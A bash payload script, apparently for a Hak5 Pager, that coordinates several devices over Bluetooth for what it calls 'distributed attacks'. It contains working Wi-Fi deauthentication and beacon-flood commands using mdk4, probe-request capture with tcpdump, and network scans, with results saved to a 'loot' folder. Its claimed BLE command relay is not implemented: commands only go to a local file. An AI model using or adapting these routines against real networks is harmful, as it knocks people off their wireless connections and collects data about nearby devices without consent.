#!/bin/bash
# Title: EINHERJAR - Swarm Master
# Description: Multi-Pager coordination via BLE mesh for distributed attacks
# Author: JMFH / FENRIR / HaleHound
# Version: 1.0.0
# Category: coordination/swarm
# Named after Odin's army of warriors - commands the pack

# === CONFIGURATION ===
BLE_ADAPTER="hci0"
LOOT_DIR="/root/loot/einherjar"
SWARM_FILE="/tmp/einherjar_swarm.txt"
COMMAND_FILE="/tmp/einherjar_cmd.txt"
RESULTS_FILE="/tmp/einherjar_results.txt"

# FENRIR identification
FENRIR_UUID="FENRIR-PAGER"
FENRIR_SERVICE="1337"  # Service UUID for FENRIR Pagers
MY_ID=$(cat /sys/class/net/wlan0mon/address 2>/dev/null || cat /sys/class/net/eth0/address 2>/dev/null | tr -d ':' | tail -c 5)

# Modes
MODE_STANDALONE=0
MODE_COMMANDER=1
MODE_WARRIOR=2

# Command types
CMD_SCAN=1
CMD_DEAUTH=2
CMD_PROBE=3
CMD_REPORT=4
CMD_BEACON=5

# === CLEANUP ===
cleanup() {
    # Stop BLE advertising
    hciconfig $BLE_ADAPTER noleadv 2>/dev/null
    hciconfig $BLE_ADAPTER down 2>/dev/null
    hciconfig $BLE_ADAPTER up 2>/dev/null

    # Kill background processes
    pkill -f "einherjar" 2>/dev/null
    kill $SCAN_PID $ADV_PID $LISTEN_PID 2>/dev/null

    LED OFF 2>/dev/null
}
trap cleanup EXIT INT TERM

# === LED PATTERNS ===
led_searching() {
    LED R 0 G 0 B 255  # Blue = searching
}

led_commander() {
    LED R 255 G 215 B 0  # Gold = commander
}

led_warrior() {
    LED R 0 G 255 B 0  # Green = warrior
}

led_action() {
    LED R 255 G 0 B 0  # Red = action
}

# === BLE FUNCTIONS ===

# Initialize BLE adapter
init_ble() {
    LOG "Initializing BLE adapter..."
    hciconfig $BLE_ADAPTER down 2>/dev/null
    sleep 0.5
    hciconfig $BLE_ADAPTER up 2>/dev/null
    sleep 0.5

    if ! hciconfig $BLE_ADAPTER | grep -q "UP RUNNING"; then
        ERROR_DIALOG "BLE adapter not available!"
        return 1
    fi
    return 0
}

# Scan for FENRIR Pagers
scan_for_pagers() {
    local duration=$1
    LOG "Scanning for FENRIR Pagers ($duration seconds)..."

    rm -f "$SWARM_FILE"
    touch "$SWARM_FILE"

    # Use hcitool lescan to find BLE devices
    timeout $duration hcitool -i $BLE_ADAPTER lescan 2>/dev/null | \
    while IFS= read -r line; do
        local mac=$(echo "$line" | grep -oE '[0-9A-Fa-f:]{17}')
        local name=$(echo "$line" | sed "s/$mac//" | xargs)

        # Check if it's a FENRIR Pager (look for our identifier)
        if echo "$name" | grep -qi "FENRIR\|PAGER\|HAK5"; then
            if ! grep -q "$mac" "$SWARM_FILE" 2>/dev/null; then
                echo "$mac|$name|$(date +%s)" >> "$SWARM_FILE"
                LOG "Found Pager: $mac ($name)"
                VIBRATE 50
            fi
        fi
    done &
    SCAN_PID=$!

    # Wait for scan
    sleep $duration
    kill $SCAN_PID 2>/dev/null
}

# Advertise as FENRIR Pager
start_advertising() {
    LOG "Starting FENRIR beacon..."

    # Set device name to include FENRIR identifier
    hciconfig $BLE_ADAPTER name "FENRIR-$MY_ID" 2>/dev/null

    # Enable LE advertising
    # This makes the Pager discoverable by other FENRIR devices
    hciconfig $BLE_ADAPTER leadv 0 2>/dev/null

    # Also advertise via classic Bluetooth
    hciconfig $BLE_ADAPTER piscan 2>/dev/null
}

# Stop advertising
stop_advertising() {
    hciconfig $BLE_ADAPTER noleadv 2>/dev/null
    hciconfig $BLE_ADAPTER noscan 2>/dev/null
}

# === COMMAND FUNCTIONS ===

# Commander: Send command to warriors
send_command() {
    local cmd_type=$1
    local cmd_data=$2
    local target_mac=$3

    LOG "Sending command $cmd_type to $target_mac..."

    # Create command packet
    local timestamp=$(date +%s)
    local cmd_packet="FENRIR|$cmd_type|$cmd_data|$timestamp|$MY_ID"

    # Send via BLE (using l2ping for basic connectivity check)
    # In a real implementation, this would use GATT characteristics
    # For now, we'll write to a shared file that warriors monitor

    echo "$cmd_packet" >> "$COMMAND_FILE"

    # Notify via LED
    led_action
    sleep 0.5
    led_commander
}

# Warrior: Execute received command
execute_command() {
    local cmd_type=$1
    local cmd_data=$2

    case $cmd_type in
        $CMD_SCAN)
            LOG "Executing: WiFi Scan"
            led_action

            # Run quick WiFi scan
            local scan_result=$(iw dev wlan0mon scan 2>/dev/null | grep -E "SSID:|signal:" | head -20)
            echo "SCAN_RESULT|$MY_ID|$scan_result" >> "$RESULTS_FILE"
            ;;

        $CMD_DEAUTH)
            LOG "Executing: Deauth Attack on $cmd_data"
            led_action

            # Run deauth (if target specified)
            if [ -n "$cmd_data" ]; then
                # Use mdk4 or aireplay-ng if available
                if command -v mdk4 >/dev/null; then
                    timeout 10 mdk4 wlan1mon d -B "$cmd_data" 2>/dev/null &
                fi
            fi
            echo "DEAUTH_RESULT|$MY_ID|completed" >> "$RESULTS_FILE"
            ;;

        $CMD_PROBE)
            LOG "Executing: Probe Capture"
            led_action

            # Capture probe requests for 30 seconds
            timeout 30 tcpdump -i wlan1mon -ne -l type mgt subtype probe-req 2>/dev/null | head -50 > /tmp/probes.txt
            local probe_count=$(wc -l < /tmp/probes.txt)
            echo "PROBE_RESULT|$MY_ID|$probe_count probes captured" >> "$RESULTS_FILE"
            ;;

        $CMD_BEACON)
            LOG "Executing: Beacon Flood"
            led_action

            # Create fake beacons (if mdk4 available)
            if command -v mdk4 >/dev/null; then
                echo "FENRIR_BEACON" > /tmp/ssid.txt
                timeout 10 mdk4 wlan1mon b -f /tmp/ssid.txt 2>/dev/null &
            fi
            echo "BEACON_RESULT|$MY_ID|flood started" >> "$RESULTS_FILE"
            ;;

        $CMD_REPORT)
            LOG "Reporting status..."
            local mem_free=$(free -m | awk '/Mem:/ {print $4}')
            local uptime=$(uptime | awk -F'up ' '{print $2}' | cut -d',' -f1)
            echo "STATUS|$MY_ID|mem:${mem_free}MB|uptime:$uptime" >> "$RESULTS_FILE"
            ;;
    esac

    led_warrior
}

# === MODE FUNCTIONS ===

# Commander Mode
run_commander() {
    LOG ""
    LOG "=== COMMANDER MODE ==="
    LOG "You are Odin. The Einherjar await your orders."
    LOG ""

    led_commander

    # Start advertising so warriors can find us
    start_advertising

    while true; do
        # Show menu
        LOG ""
        LOG "EINHERJAR Commands:"
        LOG "1. Scan for Warriors"
        LOG "2. Order: WiFi Scan"
        LOG "3. Order: Probe Capture"
        LOG "4. Order: Beacon Flood"
        LOG "5. Order: Status Report"
        LOG "6. View Results"
        LOG "7. Exit"
        LOG ""

        local choice=$(NUMBER_PICKER "Command" 1)
        case $? in
            $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED)
                break
                ;;
        esac

        case $choice in
            1)
                scan_for_pagers 15
                local warrior_count=$(wc -l < "$SWARM_FILE" 2>/dev/null || echo 0)
                LOG "Found $warrior_count warriors in range"
                ;;
            2)
                LOG "Ordering all warriors to scan..."
                send_command $CMD_SCAN "" "all"
                VIBRATE 100
                ;;
            3)
                LOG "Ordering probe capture..."
                send_command $CMD_PROBE "" "all"
                VIBRATE 100
                ;;
            4)
                LOG "Ordering beacon flood..."
                send_command $CMD_BEACON "" "all"
                VIBRATE 100
                ;;
            5)
                LOG "Requesting status reports..."
                send_command $CMD_REPORT "" "all"
                VIBRATE 100
                ;;
            6)
                if [ -f "$RESULTS_FILE" ]; then
                    LOG "=== RESULTS ==="
                    cat "$RESULTS_FILE" | while IFS='|' read -r type id data; do
                        LOG "[$id] $type: $data"
                    done
                else
                    LOG "No results yet"
                fi
                ;;
            7)
                break
                ;;
        esac
    done

    stop_advertising
}

# Warrior Mode
run_warrior() {
    LOG ""
    LOG "=== WARRIOR MODE ==="
    LOG "Awaiting orders from Odin..."
    LOG ""

    led_warrior

    # Start advertising so commander can find us
    start_advertising

    # Monitor for commands
    rm -f "$COMMAND_FILE"
    touch "$COMMAND_FILE"

    local last_cmd=""
    while true; do
        # Check for new commands
        if [ -f "$COMMAND_FILE" ]; then
            local new_cmd=$(tail -1 "$COMMAND_FILE" 2>/dev/null)
            if [ -n "$new_cmd" ] && [ "$new_cmd" != "$last_cmd" ]; then
                last_cmd="$new_cmd"

                # Parse command
                local cmd_type=$(echo "$new_cmd" | cut -d'|' -f2)
                local cmd_data=$(echo "$new_cmd" | cut -d'|' -f3)

                LOG "Received order: $cmd_type"
                VIBRATE 50

                execute_command "$cmd_type" "$cmd_data"
            fi
        fi

        # Check for exit (button press)
        if check_button_press; then
            break
        fi

        sleep 2
    done

    stop_advertising
}

# Standalone Mode - scan and report
run_standalone() {
    LOG ""
    LOG "=== STANDALONE MODE ==="
    LOG "Scanning environment..."
    LOG ""

    led_searching

    # Scan for Pagers
    scan_for_pagers 20

    local warrior_count=$(wc -l < "$SWARM_FILE" 2>/dev/null || echo 0)

    if [ $warrior_count -gt 0 ]; then
        LOG ""
        LOG "Found $warrior_count FENRIR Pagers!"
        LOG ""
        cat "$SWARM_FILE" | while IFS='|' read -r mac name ts; do
            LOG "  $mac - $name"
        done
        LOG ""

        DIALOG_RESULT=$(CONFIRMATION_DIALOG "Become Commander of $warrior_count warriors?")
        if [ "$DIALOG_RESULT" = "1" ]; then
            run_commander
        fi
    else
        LOG "No other FENRIR Pagers found"
        LOG ""
        DIALOG_RESULT=$(CONFIRMATION_DIALOG "Start Warrior mode (listen for commander)?")
        if [ "$DIALOG_RESULT" = "1" ]; then
            run_warrior
        fi
    fi
}

# Check for button press (non-blocking)
check_button_press() {
    local data=$(timeout 0.1 dd if=/dev/input/event0 bs=16 count=1 2>/dev/null | hexdump -e '16/1 "%02x "' 2>/dev/null)
    [ -z "$data" ] && return 1

    local type=$(echo "$data" | cut -d' ' -f9-10)
    local value=$(echo "$data" | cut -d' ' -f13)

    if [ "$type" = "01 00" ] && [ "$value" = "01" ]; then
        return 0
    fi
    return 1
}

# === MAIN EXECUTION ===

LOG ""
LOG " ___ ___ _  _ _  _ ___ ___ "
LOG "| __|_ _| \\| | || | __| _ \\"
LOG "| _| | || .\` | __ | _||   /"
LOG "|___|___|_|\\_|_||_|___|_|_\\"
LOG "     _ _   ___    _   ___  "
LOG "  _ | /_\\ | _ \\  /_\\ | _ \\ "
LOG " | || / _ \\|   / / _ \\|   / "
LOG "  \\__/_/ \\_\\_|_\\/_/ \\_\\_|_\\ "
LOG ""
LOG " Swarm Coordinator v1.0"
LOG " Pager ID: FENRIR-$MY_ID"
LOG ""

# Initialize
mkdir -p "$LOOT_DIR"
rm -f "$SWARM_FILE" "$COMMAND_FILE" "$RESULTS_FILE"

# Check BLE
if ! init_ble; then
    exit 1
fi

PROMPT "EINHERJAR coordinates multiple FENRIR Pagers for distributed attacks.

Your ID: FENRIR-$MY_ID

Modes:
- Commander: Control other Pagers
- Warrior: Accept orders from Commander
- Standalone: Auto-detect role

Press OK to continue."

# Mode selection
LOG ""
LOG "Select Mode:"
LOG "1. Auto-Detect (Recommended)"
LOG "2. Commander (Lead the swarm)"
LOG "3. Warrior (Join a swarm)"
LOG ""

mode_choice=$(NUMBER_PICKER "Select Mode (1-3)" 1)
case $? in
    $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
        LOG "Cancelled"
        exit 1
        ;;
esac

[ -z "$mode_choice" ] && mode_choice=1

case $mode_choice in
    1)
        run_standalone
        ;;
    2)
        run_commander
        ;;
    3)
        run_warrior
        ;;
    *)
        run_standalone
        ;;
esac

# Save results
if [ -f "$RESULTS_FILE" ]; then
    timestamp=$(date +%Y%m%d_%H%M%S)
    cp "$RESULTS_FILE" "$LOOT_DIR/swarm_results_$timestamp.txt"
    LOG "Results saved to $LOOT_DIR/swarm_results_$timestamp.txt"
fi

led_done() {
    LED R 0 G 255 B 0
}
led_done

ALERT "EINHERJAR Session Complete

Results saved to:
$LOOT_DIR"

exit 0
